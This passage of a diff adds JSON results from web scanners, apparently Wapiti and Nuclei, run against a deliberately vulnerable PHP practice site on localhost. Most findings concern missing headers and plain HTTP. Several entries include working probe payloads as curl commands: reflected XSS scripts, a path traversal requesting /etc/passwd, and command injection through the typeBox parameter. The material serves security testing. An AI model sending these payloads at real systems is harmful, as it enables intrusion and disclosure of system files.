+          "info": "X-Content-Type-Options is not set",
+          "curl_command": "curl \"http://localhost:9991/www/XSS/XSS_level2.php\"",
+          "wstg": [
+            "OSHP-X-Content-Type-Options"
+          ]
+        }
+      ],
+      "Unencrypted Channels": [
+        {
+          "path": "/www/XSS/XSS_level2.php",
+          "info": "No HTTPS redirection for this host. All HTTP requests are served in clear text.",
+          "curl_command": "curl \"http://localhost:9991/www/XSS/XSS_level2.php\"",
+          "wstg": [
+            "WSTG-CRYP-03"
+          ]
+        },
+        {
+          "path": "/www/XSS/XSS_level2.php",
+          "info": "Sensitive data (GET parameters) was sent over an unencrypted HTTP connection to http://localhost:9991/www/XSS/XSS_level2.php?username=alice&submit=Submit. The server did not enforce HTTPS.",
+          "curl_command": "curl \"http://localhost:9991/www/XSS/XSS_level2.php?username=alice&submit=Submit\" -e \"http://localhost:9991/www/XSS/XSS_level2.php\"",
+          "wstg": [
+            "WSTG-CRYP-03"
+          ]
+        }
+      ],
+      "Reflected Cross Site Scripting": [
+        {
+          "path": "/www/XSS/XSS_level2.php",
+          "info": "Reflected Cross Site Scripting vulnerability found via injection in the parameter username",
+          "parameter": "username",
+          "curl_command": "curl \"http://localhost:9991/www/XSS/XSS_level2.php?username=%3CScRiPt%3Ealert%28%27wl466xp844%27%29%3C%2FsCrIpT%3E&submit=Submit\" -e \"http://localhost:9991/www/XSS/XSS_level2.php\"",
+          "wstg": [
+            "WSTG-INPV-01"
+          ]
+        }
+      ]
+    }
+  },
+  "www_SQL_sql1_php": {
+    "nuclei": {},
+    "wapiti": {
+      "Content Security Policy Configuration": [
+        {
+          "path": "/www/SQL/sql1.php",
+          "info": "CSP is not set for URL: http://localhost:9991/www/SQL/sql1.php",
+          "curl_command": "curl \"http://localhost:9991/www/SQL/sql1.php\"",
+          "wstg": [
+            "WSTG-CONF-12",
+            "OSHP-Content-Security-Policy"
+          ]
+        }
+      ],
+      "Clickjacking Protection": [
+        {
+          "path": "/www/SQL/sql1.php",
+          "info": "X-Frame-Options is not set",
+          "curl_command": "curl \"http://localhost:9991/www/SQL/sql1.php\"",
+          "wstg": [
+            "OSHP-X-Frame-Options"
+          ]
+        }
+      ],
+      "MIME Type Confusion": [
+        {
+          "path": "/www/SQL/sql1.php",
+          "info": "X-Content-Type-Options is not set",
+          "curl_command": "curl \"http://localhost:9991/www/SQL/sql1.php\"",
+          "wstg": [
+            "OSHP-X-Content-Type-Options"
+          ]
+        }
+      ],
+      "Unencrypted Channels": [
+        {
+          "path": "/www/SQL/sql1.php",
+          "info": "No HTTPS redirection for this host. All HTTP requests are served in clear text.",
+          "curl_command": "curl \"http://localhost:9991/www/SQL/sql1.php\"",
+          "wstg": [
+            "WSTG-CRYP-03"
+          ]
+        },
+        {
+          "path": "/www/SQL/sql1.php",
+          "info": "Sensitive data (POST data) was sent over an unencrypted HTTP connection to http://localhost:9991/www/SQL/sql1.php. The server did not enforce HTTPS.",
+          "curl_command": "curl \"http://localhost:9991/www/SQL/sql1.php\" -e \"http://localhost:9991/www/SQL/sql1.php\" -d \"firstname=default&submit=Submit\"",
+          "wstg": [
+            "WSTG-CRYP-03"
+          ]
+        }
+      ]
+    }
+  },
+  "www": {
+    "nuclei": {},
+    "wapiti": {
+      "Content Security Policy Configuration": [
+        {
+          "path": "/www",
+          "info": "CSP is not set for URL: http://localhost:9991/www",
+          "curl_command": "curl \"http://localhost:9991/www\"",
+          "wstg": [
+            "WSTG-CONF-12",
+            "OSHP-Content-Security-Policy"
+          ]
+        }
+      ],
+      "Clickjacking Protection": [
+        {
+          "path": "/www",
+          "info": "X-Frame-Options is not set",
+          "curl_command": "curl \"http://localhost:9991/www\"",
+          "wstg": [
+            "OSHP-X-Frame-Options"
+          ]
+        }
+      ],
+      "MIME Type Confusion": [
+        {
+          "path": "/www",
+          "info": "X-Content-Type-Options is not set",
+          "curl_command": "curl \"http://localhost:9991/www\"",
+          "wstg": [
+            "OSHP-X-Content-Type-Options"
+          ]
+        }
+      ],
+      "Unencrypted Channels": [
+        {
+          "path": "/www",
+          "info": "No HTTPS redirection for this host. All HTTP requests are served in clear text.",
+          "curl_command": "curl \"http://localhost:9991/www\"",
+          "wstg": [
+            "WSTG-CRYP-03"
+          ]
+        },
+        {
+          "path": "/www/",
+          "info": "Sensitive data (POST data) was sent over an unencrypted HTTP connection to http://localhost:9991/www/. The server did not enforce HTTPS.",
+          "curl_command": "curl \"http://localhost:9991/www/\" -e \"http://localhost:9991/www/\" -d \"submit=Enter\"",
+          "wstg": [
+            "WSTG-CRYP-03"
+          ]
+        }
+      ],
+      "Inconsistent Redirection": [
+        {
+          "path": "/www",
+          "info": "3xx redirection contains unexpected HTML body (links/forms)",
+          "curl_command": "curl \"http://localhost:9991/www\"",
+          "wstg": [
+            "WSTG-INFO-05"
+          ]
+        }
+      ]
+    }
+  },
+  "www_Resources_gazicyber_jpg": {
+    "nuclei": {},
+    "wapiti": {
+      "Clickjacking Protection": [
+        {
+          "path": "/www/Resources/gazicyber.jpg",
+          "info": "X-Frame-Options is not set",
+          "curl_command": "curl \"http://localhost:9991/www/Resources/gazicyber.jpg\"",
+          "wstg": [
+            "OSHP-X-Frame-Options"
+          ]
+        }
+      ],
+      "MIME Type Confusion": [
+        {
+          "path": "/www/Resources/gazicyber.jpg",
+          "info": "X-Content-Type-Options is not set",
+          "curl_command": "curl \"http://localhost:9991/www/Resources/gazicyber.jpg\"",
+          "wstg": [
+            "OSHP-X-Content-Type-Options"
+          ]
+        }
+      ]
+    }
+  },
+  "www_FileInclusion_pages_lvl1_php": {
+    "nuclei": {},
+    "wapiti": {
+      "Content Security Policy Configuration": [
+        {
+          "path": "/www/FileInclusion/pages/lvl1.php",
+          "info": "CSP is not set for URL: http://localhost:9991/www/FileInclusion/pages/lvl1.php",
+          "curl_command": "curl \"http://localhost:9991/www/FileInclusion/pages/lvl1.php\"",
+          "wstg": [
+            "WSTG-CONF-12",
+            "OSHP-Content-Security-Policy"
+          ]
+        }
+      ],
+      "Path Traversal": [
+        {
+          "path": "/www/FileInclusion/pages/lvl1.php",
+          "info": "Linux local file disclosure vulnerability via injection in the parameter file",
+          "parameter": "file",
+          "curl_command": "curl \"http://localhost:9991/www/FileInclusion/pages/lvl1.php?file=%2Fetc%2Fpasswd\"",
+          "wstg": [
+            "WSTG-ATHZ-01"
+          ]
+        }
+      ],
+      "Clickjacking Protection": [
+        {
+          "path": "/www/FileInclusion/pages/lvl1.php",
+          "info": "X-Frame-Options is not set",
+          "curl_command": "curl \"http://localhost:9991/www/FileInclusion/pages/lvl1.php\"",
+          "wstg": [
+            "OSHP-X-Frame-Options"
+          ]
+        }
+      ],
+      "MIME Type Confusion": [
+        {
+          "path": "/www/FileInclusion/pages/lvl1.php",
+          "info": "X-Content-Type-Options is not set",
+          "curl_command": "curl \"http://localhost:9991/www/FileInclusion/pages/lvl1.php\"",
+          "wstg": [
+            "OSHP-X-Content-Type-Options"
+          ]
+        }
+      ],
+      "Unencrypted Channels": [
+        {
+          "path": "/www/FileInclusion/pages/lvl1.php",
+          "info": "No HTTPS redirection for this host. All HTTP requests are served in clear text.",
+          "curl_command": "curl \"http://localhost:9991/www/FileInclusion/pages/lvl1.php\"",
+          "wstg": [
+            "WSTG-CRYP-03"
+          ]
+        },
+        {
+          "path": "/www/FileInclusion/pages/lvl1.php",
+          "info": "Sensitive data (GET parameters) was sent over an unencrypted HTTP connection to http://localhost:9991/www/FileInclusion/pages/lvl1.php?file=1.php. The server did not enforce HTTPS.",
+          "curl_command": "curl \"http://localhost:9991/www/FileInclusion/pages/lvl1.php?file=1.php\"",
+          "wstg": [
+            "WSTG-CRYP-03"
+          ]
+        }
+      ],
+      "Reflected Cross Site Scripting": [
+        {
+          "path": "/www/FileInclusion/pages/lvl1.php",
+          "info": "Reflected Cross Site Scripting vulnerability found via injection in the parameter file",
+          "parameter": "file",
+          "curl_command": "curl \"http://localhost:9991/www/FileInclusion/pages/lvl1.php?file=%3CScRiPt%3Ealert%28%27wzdgu33l23%27%29%3C%2FsCrIpT%3E\"",
+          "wstg": [
+            "WSTG-INPV-01"
+          ]
+        }
+      ]
+    }
+  },
+  "www_Resources_button_css": {
+    "nuclei": {},
+    "wapiti": {
+      "Clickjacking Protection": [
+        {
+          "path": "/www/Resources/button.css",
+          "info": "X-Frame-Options is not set",
+          "curl_command": "curl \"http://localhost:9991/www/Resources/button.css\"",
+          "wstg": [
+            "OSHP-X-Frame-Options"
+          ]
+        }
+      ],
+      "MIME Type Confusion": [
+        {
+          "path": "/www/Resources/button.css",
+          "info": "X-Content-Type-Options is not set",
+          "curl_command": "curl \"http://localhost:9991/www/Resources/button.css\"",
+          "wstg": [
+            "OSHP-X-Content-Type-Options"
+          ]
+        }
+      ]
+    }
+  },
+  "www_SQL_sqlmainpage_html": {
+    "nuclei": {},
+    "wapiti": {
+      "Content Security Policy Configuration": [
+        {
+          "path": "/www/SQL/sqlmainpage.html",
+          "info": "CSP is not set for URL: http://localhost:9991/www/SQL/sqlmainpage.html",
+          "curl_command": "curl \"http://localhost:9991/www/SQL/sqlmainpage.html\"",
+          "wstg": [
+            "WSTG-CONF-12",
+            "OSHP-Content-Security-Policy"
+          ]
+        }
+      ],
+      "Clickjacking Protection": [
+        {
+          "path": "/www/SQL/sqlmainpage.html",
+          "info": "X-Frame-Options is not set",
+          "curl_command": "curl \"http://localhost:9991/www/SQL/sqlmainpage.html\"",
+          "wstg": [
+            "OSHP-X-Frame-Options"
+          ]
+        }
+      ],
+      "MIME Type Confusion": [
+        {
+          "path": "/www/SQL/sqlmainpage.html",
+          "info": "X-Content-Type-Options is not set",
+          "curl_command": "curl \"http://localhost:9991/www/SQL/sqlmainpage.html\"",
+          "wstg": [
+            "OSHP-X-Content-Type-Options"
+          ]
+        }
+      ],
+      "Unencrypted Channels": [
+        {
+          "path": "/www/SQL/sqlmainpage.html",
+          "info": "No HTTPS redirection for this host. All HTTP requests are served in clear text.",
+          "curl_command": "curl \"http://localhost:9991/www/SQL/sqlmainpage.html\"",
+          "wstg": [
+            "WSTG-CRYP-03"
+          ]
+        }
+      ]
+    }
+  },
+  "www_XSS_XSS_level4_php": {
+    "nuclei": {
+      "sql": [],
+      "cve": [],
+      "xss": [
+        {
+          "info": {
+            "name": "Fuzzing Parameters - Cross-Site Scripting",
+            "description": "Cross-site scripting was discovered via a search for reflected parameter values in the server response via GET-requests.\n",
+            "impact": "N/A",
+            "severity": "medium",
+            "classification": {
+              "cve-id": []
+            }
+          },
+          "matched-at": "http://localhost:9991/www/XSS/XSS_level4.php/?location=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-location%27%29%3E&link_url=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-link_url%27%29%3E&post_mime_type=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-post_mime_type%27%29%3E&uid=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-uid%27%29%3E&host=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-host%27%29%3E&cmd=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-cmd%27%29%3E&link_id=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-link_id%27%29%3E&reset=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-reset%27%29%3E&nonce=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-nonce%27%29%3E&username=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-username%27%29%3E&site=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-site%27%29%3E&do=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-do%27%29%3E&email=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-email%27%29%3E",
+          "request": "GET /www/XSS/XSS_level4.php/?location=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-location%27%29%3E&link_url=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-link_url%27%29%3E&post_mime_type=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-post_mime_type%27%29%3E&uid=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-uid%27%29%3E&host=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-host%27%29%3E&cmd=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-cmd%27%29%3E&link_id=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-link_id%27%29%3E&reset=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-reset%27%29%3E&nonce=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-nonce%27%29%3E&username=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-username%27%29%3E&site=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-site%27%29%3E&do=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-do%27%29%3E&email=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-email%27%29%3E HTTP/1.1\r\nHost: localhost:9991\r\nUser-Agent: Mozilla/5.0 (Fedora; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36\r\nAccept: */*\r\nAccept-Language: en\r\nAccept-Encoding: gzip\r\n\r\n",
+          "response": "HTTP/1.1 200 OK\r\nConnection: close\r\nContent-Length: 598\r\nContent-Type: text/html; charset=UTF-8\r\nDate: Sun, 02 Nov 2025 09:51:11 GMT\r\nServer: Apache/2.4.18 (Unix) OpenSSL/1.0.2h PHP/5.6.21 mod_perl/2.0.8-dev Perl/v5.16.3\r\nX-Powered-By: PHP/5.6.21\r\n\r\n<!DOCTYPE html>\n<html>\n<head>\n\t<title>XSS 4</title>\n</head>\n<body>\n\t\n\t <div style=\"background-color:#c9c9c9;padding:15px;\">\n      <button type=\"button\" name=\"homeButton\" onclick=\"location.href='../homepage.html';\">Home Page</button>\n      <button type=\"button\" name=\"mainButton\" onclick=\"location.href='xssmainpage.html';\">Main Page</button>\n    </div>\n<div align=\"center\">\n<form method=\"GET\" action=\"\" name=\"form\">\n   <p>Your name:<input type=\"text\" name=\"username\"></p>\n   <input type=\"submit\" name=\"submit\" value=\"Submit\">\n</form>\n\t</div>\n'>\"<svg/onload=confirm('xss-username')>\n</body>\n</html>\n",
+          "ip": "127.0.0.1",
+          "curl-command": "curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Fedora; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36' 'http://localhost:9991/www/XSS/XSS_level4.php/?location=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-location%27%29%3E&link_url=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-link_url%27%29%3E&post_mime_type=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-post_mime_type%27%29%3E&uid=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-uid%27%29%3E&host=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-host%27%29%3E&cmd=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-cmd%27%29%3E&link_id=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-link_id%27%29%3E&reset=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-reset%27%29%3E&nonce=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-nonce%27%29%3E&username=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-username%27%29%3E&site=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-site%27%29%3E&do=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-do%27%29%3E&email=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-email%27%29%3E'"
+        }
+      ]
+    },
+    "wapiti": {
+      "Content Security Policy Configuration": [
+        {
+          "path": "/www/XSS/XSS_level4.php",
+          "info": "CSP is not set for URL: http://localhost:9991/www/XSS/XSS_level4.php",
+          "curl_command": "curl \"http://localhost:9991/www/XSS/XSS_level4.php\"",
+          "wstg": [
+            "WSTG-CONF-12",
+            "OSHP-Content-Security-Policy"
+          ]
+        }
+      ],
+      "Clickjacking Protection": [
+        {
+          "path": "/www/XSS/XSS_level4.php",
+          "info": "X-Frame-Options is not set",
+          "curl_command": "curl \"http://localhost:9991/www/XSS/XSS_level4.php\"",
+          "wstg": [
+            "OSHP-X-Frame-Options"
+          ]
+        }
+      ],
+      "MIME Type Confusion": [
+        {
+          "path": "/www/XSS/XSS_level4.php",
+          "info": "X-Content-Type-Options is not set",
+          "curl_command": "curl \"http://localhost:9991/www/XSS/XSS_level4.php\"",
+          "wstg": [
+            "OSHP-X-Content-Type-Options"
+          ]
+        }
+      ],
+      "Unencrypted Channels": [
+        {
+          "path": "/www/XSS/XSS_level4.php",
+          "info": "No HTTPS redirection for this host. All HTTP requests are served in clear text.",
+          "curl_command": "curl \"http://localhost:9991/www/XSS/XSS_level4.php\"",
+          "wstg": [
+            "WSTG-CRYP-03"
+          ]
+        },
+        {
+          "path": "/www/XSS/XSS_level4.php",
+          "info": "Sensitive data (GET parameters) was sent over an unencrypted HTTP connection to http://localhost:9991/www/XSS/XSS_level4.php?username=alice&submit=Submit. The server did not enforce HTTPS.",
+          "curl_command": "curl \"http://localhost:9991/www/XSS/XSS_level4.php?username=alice&submit=Submit\" -e \"http://localhost:9991/www/XSS/XSS_level4.php\"",
+          "wstg": [
+            "WSTG-CRYP-03"
+          ]
+        }
+      ],
+      "Reflected Cross Site Scripting": [
+        {
+          "path": "/www/XSS/XSS_level4.php",
+          "info": "Reflected Cross Site Scripting vulnerability found via injection in the parameter username",
+          "parameter": "username",
+          "curl_command": "curl \"http://localhost:9991/www/XSS/XSS_level4.php?username=%3CSvG%2FoNloAd%3Dalert%28%2Fwzcim2fjp5%2F%29%3E&submit=Submit\" -e \"http://localhost:9991/www/XSS/XSS_level4.php\"",
+          "wstg": [
+            "WSTG-INPV-01"
+          ]
+        }
+      ]
+    }
+  },
+  "www_CommandExecution_CommandExec-3_php": {
+    "nuclei": {},
+    "wapiti": {
+      "Content Security Policy Configuration": [
+        {
+          "path": "/www/CommandExecution/CommandExec-3.php",
+          "info": "CSP is not set for URL: http://localhost:9991/www/CommandExecution/CommandExec-3.php",
+          "curl_command": "curl \"http://localhost:9991/www/CommandExecution/CommandExec-3.php\"",
+          "wstg": [
+            "WSTG-CONF-12",
+            "OSHP-Content-Security-Policy"
+          ]
+        }
+      ],
+      "Command execution": [
+        {
+          "path": "/www/CommandExecution/CommandExec-3.php",
+          "info": "Command execution via injection in the parameter typeBox",
+          "parameter": "typeBox",
+          "curl_command": "curl \"http://localhost:9991/www/CommandExecution/CommandExec-3.php?typeBox=id\" -e \"http://localhost:9991/www/CommandExecution/CommandExec-3.php\"",
+          "wstg": [
+            "WSTG-INPV-12"
+          ]
+        }
+      ],
+      "Clickjacking Protection": [
+        {
+          "path": "/www/CommandExecution/CommandExec-3.php",
+          "info": "X-Frame-Options is not set",
+          "curl_command": "curl \"http://localhost:9991/www/CommandExecution/CommandExec-3.php\"",
+          "wstg": [
+            "OSHP-X-Frame-Options"
+          ]
+        }
+      ],
+      "MIME Type Confusion": [
+        {
+          "path": "/www/CommandExecution/CommandExec-3.php",
+          "info": "X-Content-Type-Options is not set",
+          "curl_command": "curl \"http://localhost:9991/www/CommandExecution/CommandExec-3.php\"",
+          "wstg": [
+            "OSHP-X-Content-Type-Options"
+          ]
+        }
+      ],
+      "Unencrypted Channels": [
+        {
+          "path": "/www/CommandExecution/CommandExec-3.php",
+          "info": "No HTTPS redirection for this host. All HTTP requests are served in clear text.",
+          "curl_command": "curl \"http://localhost:9991/www/CommandExecution/CommandExec-3.php\"",
+          "wstg": [
+            "WSTG-CRYP-03"
+          ]
+        },
+        {
+          "path": "/www/CommandExecution/CommandExec-3.php",
+          "info": "Sensitive data (GET parameters) was sent over an unencrypted HTTP connection to http://localhost:9991/www/CommandExecution/CommandExec-3.php?typeBox=default. The server did not enforce HTTPS.",
+          "curl_command": "curl \"http://localhost:9991/www/CommandExecution/CommandExec-3.php?typeBox=default\" -e \"http://localhost:9991/www/CommandExecution/CommandExec-3.php\"",
+          "wstg": [
+            "WSTG-CRYP-03"
+          ]
+        }
+      ]
+    }
+  },
+  "www_FileInclusion_pages_lvl3_php": {
+    "nuclei": {},
+    "wapiti": {
+      "Content Security Policy Configuration": [
+        {
+          "path": "/www/FileInclusion/pages/lvl3.php",
+          "info": "CSP is not set for URL: http://localhost:9991/www/FileInclusion/pages/lvl3.php",
+          "curl_command": "curl \"http://localhost:9991/www/FileInclusion/pages/lvl3.php\"",
+          "wstg": [
+            "WSTG-CONF-12",
+            "OSHP-Content-Security-Policy"
+          ]
+        }
+      ],
+      "Path Traversal": [
+        {
+          "path": "/www/FileInclusion/pages/lvl3.php",
+          "info": "Possible include() vulnerability via injection in the parameter file (Constraints: suffix)",
+          "parameter": "file",
+          "curl_command": "curl \"http://localhost:9991/www/FileInclusion/pages/lvl3.php?file=lvl3.php\"",
+          "wstg": [
+            "WSTG-ATHZ-01"
+          ]
+        }
+      ],
+      "Clickjacking Protection": [
+        {
+          "path": "/www/FileInclusion/pages/lvl3.php",
+          "info": "X-Frame-Options is not set",
+          "curl_command": "curl \"http://localhost:9991/www/FileInclusion/pages/lvl3.php\"",
+          "wstg": [
+            "OSHP-X-Frame-Options"
+          ]
+        }
+      ],
+      "MIME Type Confusion": [
+        {
+          "path": "/www/FileInclusion/pages/lvl3.php",
+          "info": "X-Content-Type-Options is not set",
+          "curl_command": "curl \"http://localhost:9991/www/FileInclusion/pages/lvl3.php\"",
+          "wstg": [
+            "OSHP-X-Content-Type-Options"
+          ]
+        }
+      ],
+      "Unencrypted Channels": [
+        {
+          "path": "/www/FileInclusion/pages/lvl3.php",
+          "info": "No HTTPS redirection for this host. All HTTP requests are served in clear text.",
+          "curl_command": "curl \"http://localhost:9991/www/FileInclusion/pages/lvl3.php\"",
+          "wstg": [
+            "WSTG-CRYP-03"
+          ]
+        },
+        {
+          "path": "/www/FileInclusion/pages/lvl3.php",
+          "info": "Sensitive data (GET parameters) was sent over an unencrypted HTTP connection to http://localhost:9991/www/FileInclusion/pages/lvl3.php?file=2. The server did not enforce HTTPS.",
+          "curl_command": "curl \"http://localhost:9991/www/FileInclusion/pages/lvl3.php?file=2\"",
+          "wstg": [
+            "WSTG-CRYP-03"
+          ]
+        }
+      ]
+    }
+  },
+  "www_SQL_sql3_php": {
+    "nuclei": {},
+    "wapiti": {
+      "Content Security Policy Configuration": [
+        {
+          "path": "/www/SQL/sql3.php",
+          "info": "CSP is not set for URL: http://localhost:9991/www/SQL/sql3.php",
+          "curl_command": "curl \"http://localhost:9991/www/SQL/sql3.php\"",
+          "wstg": [
+            "WSTG-CONF-12",
+            "OSHP-Content-Security-Policy"
+          ]
+        }
+      ],
+      "Clickjacking Protection": [
+        {
+          "path": "/www/SQL/sql3.php",
+          "info": "X-Frame-Options is not set",
+          "curl_command": "curl \"http://localhost:9991/www/SQL/sql3.php\"",
+          "wstg": [
+            "OSHP-X-Frame-Options"
+          ]
+        }
+      ],
+      "MIME Type Confusion": [
+        {
+          "path": "/www/SQL/sql3.php",
+          "info": "X-Content-Type-Options is not set",
+          "curl_command": "curl \"http://localhost:9991/www/SQL/sql3.php\"",
+          "wstg": [
+            "OSHP-X-Content-Type-Options"
+          ]
+        }
+      ],
+      "Unencrypted Channels": [
+        {
+          "path": "/www/SQL/sql3.php",
+          "info": "No HTTPS redirection for this host. All HTTP requests are served in clear text.",
+          "curl_command": "curl \"http://localhost:9991/www/SQL/sql3.php\"",
+          "wstg": [
+            "WSTG-CRYP-03"
+          ]
+        },
+        {
+          "path": "/www/SQL/sql3.php",
+          "info": "Sensitive data (POST data) was sent over an unencrypted HTTP connection to http://localhost:9991/www/SQL/sql3.php. The server did not enforce HTTPS.",
+          "curl_command": "curl \"http://localhost:9991/www/SQL/sql3.php\" -e \"http://localhost:9991/www/SQL/sql3.php\" -d \"number=default&submit=Submit\"",
+          "wstg": [
+            "WSTG-CRYP-03"
+          ]
+        }
+      ],
+      "Reflected Cross Site Scripting": [
+        {
+          "path": "/www/SQL/sql3.php",
+          "info": "Reflected Cross Site Scripting vulnerability found via injection in the parameter number",
+          "parameter": "number",
+          "curl_command": "curl \"http://localhost:9991/www/SQL/sql3.php\" -e \"http://localhost:9991/www/SQL/sql3.php\" -d \"number=%3CScRiPt%3Ealert%28%27wta3jcnskh%27%29%3C%2FsCrIpT%3E&submit=Submit\"",
+          "wstg": [
+            "WSTG-INPV-01"
+          ]
+        }
+      ]
+    }
+  },
+  "www_CommandExecution_commandexec_html": {
+    "nuclei": {},
+    "wapiti": {
+      "Content Security Policy Configuration": [
+        {
+          "path": "/www/CommandExecution/commandexec.html",
+          "info": "CSP is not set for URL: http://localhost:9991/www/CommandExecution/commandexec.html",
+          "curl_command": "curl \"http://localhost:9991/www/CommandExecution/commandexec.html\"",
+          "wstg": [
+            "WSTG-CONF-12",
+            "OSHP-Content-Security-Policy"
+          ]
+        }
+      ],
+      "Clickjacking Protection": [
+        {
+          "path": "/www/CommandExecution/commandexec.html",
+          "info": "X-Frame-Options is not set",
+          "curl_command": "curl \"http://localhost:9991/www/CommandExecution/commandexec.html\"",
+          "wstg": [
+            "OSHP-X-Frame-Options"
+          ]
+        }
+      ],
+      "MIME Type Confusion": [
+        {
+          "path": "/www/CommandExecution/commandexec.html",
+          "info": "X-Content-Type-Options is not set",
+          "curl_command": "curl \"http://localhost:9991/www/CommandExecution/commandexec.html\"",
+          "wstg": [
+            "OSHP-X-Content-Type-Options"
+          ]
+        }
+      ],
+      "Unencrypted Channels": [
+        {
+          "path": "/www/CommandExecution/commandexec.html",
+          "info": "No HTTPS redirection for this host. All HTTP requests are served in clear text.",
+          "curl_command": "curl \"http://localhost:9991/www/CommandExecution/commandexec.html\"",
+          "wstg": [
+            "WSTG-CRYP-03"
+          ]
+        }
+      ]
+    }
+  },
+  "www_SQL_sql4_php": {
+    "nuclei": {},
+    "wapiti": {
+      "Content Security Policy Configuration": [
+        {
+          "path": "/www/SQL/sql4.php",
+          "info": "CSP is not set for URL: http://localhost:9991/www/SQL/sql4.php",
+          "curl_command": "curl \"http://localhost:9991/www/SQL/sql4.php\"",
+          "wstg": [
+            "WSTG-CONF-12",
+            "OSHP-Content-Security-Policy"
+          ]
+        }
+      ],
+      "Clickjacking Protection": [
+        {
+          "path": "/www/SQL/sql4.php",
+          "info": "X-Frame-Options is not set",
+          "curl_command": "curl \"http://localhost:9991/www/SQL/sql4.php\"",
+          "wstg": [
+            "OSHP-X-Frame-Options"
+          ]
+        }
+      ],
+      "MIME Type Confusion": [
+        {
+          "path": "/www/SQL/sql4.php",
+          "info": "X-Content-Type-Options is not set",
+          "curl_command": "curl \"http://localhost:9991/www/SQL/sql4.php\"",
+          "wstg": [
+            "OSHP-X-Content-Type-Options"
+          ]
+        }
+      ],
+      "Unencrypted Channels": [
+        {
+          "path": "/www/SQL/sql4.php",
+          "info": "No HTTPS redirection for this host. All HTTP requests are served in clear text.",
+          "curl_command": "curl \"http://localhost:9991/www/SQL/sql4.php\"",
+          "wstg": [
+            "WSTG-CRYP-03"
+          ]
+        },
+        {
+          "path": "/www/SQL/sql4.php",
+          "info": "Sensitive data (POST data) was sent over an unencrypted HTTP connection to http://localhost:9991/www/SQL/sql4.php. The server did not enforce HTTPS.",
+          "curl_command": "curl \"http://localhost:9991/www/SQL/sql4.php\" -e \"http://localhost:9991/www/SQL/sql4.php\" -d \"number=default&submit=Submit\"",
+          "wstg": [
+            "WSTG-CRYP-03"
+          ]
+        }
+      ],
+      "Reflected Cross Site Scripting": [
+        {
+          "path": "/www/SQL/sql4.php",
+          "info": "Reflected Cross Site Scripting vulnerability found via injection in the parameter number",
+          "parameter": "number",
+          "curl_command": "curl \"http://localhost:9991/www/SQL/sql4.php\" -e \"http://localhost:9991/www/SQL/sql4.php\" -d \"number=%3CScRiPt%3Ealert%28%22wqmplm1cjj%22%29%3C%2FsCrIpT%3E&submit=Submit\"",
+          "wstg": [
+            "WSTG-INPV-01"
+          ]
+        }
+      ]
+    }
+  },
+  "www_SQL_sql6_php": {
+    "nuclei": {},
+    "wapiti": {
+      "Content Security Policy Configuration": [
+        {
+          "path": "/www/SQL/sql6.php",
+          "info": "CSP is not set for URL: http://localhost:9991/www/SQL/sql6.php",
+          "curl_command": "curl \"http://localhost:9991/www/SQL/sql6.php\"",
+          "wstg": [
+            "WSTG-CONF-12",
+            "OSHP-Content-Security-Policy"
+          ]
+        }
+      ],
+      "Clickjacking Protection": [
+        {
+          "path": "/www/SQL/sql6.php",
+          "info": "X-Frame-Options is not set",
+          "curl_command": "curl \"http://localhost:9991/www/SQL/sql6.php\"",
+          "wstg": [
+            "OSHP-X-Frame-Options"
+          ]
+        }
+      ],
+      "MIME Type Confusion": [
+        {
+          "path": "/www/SQL/sql6.php",
+          "info": "X-Content-Type-Options is not set",
+          "curl_command": "curl \"http://localhost:9991/www/SQL/sql6.php\"",
+          "wstg": [
+            "OSHP-X-Content-Type-Options"
+          ]
+        }
+      ],
+      "Unencrypted Channels": [
+        {
+          "path": "/www/SQL/sql6.php",
+          "info": "No HTTPS redirection for this host. All HTTP requests are served in clear text.",
+          "curl_command": "curl \"http://localhost:9991/www/SQL/sql6.php\"",
+          "wstg": [
+            "WSTG-CRYP-03"
+          ]
+        },
+        {
+          "path": "/www/SQL/sql6.php",
+          "info": "Sensitive data (GET parameters) was sent over an unencrypted HTTP connection to http://localhost:9991/www/SQL/sql6.php?number=default&submit=Submit. The server did not enforce HTTPS.",
+          "curl_command": "curl \"http://localhost:9991/www/SQL/sql6.php?number=default&submit=Submit\" -e \"http://localhost:9991/www/SQL/sql6.php\"",
+          "wstg": [
+            "WSTG-CRYP-03"
+          ]
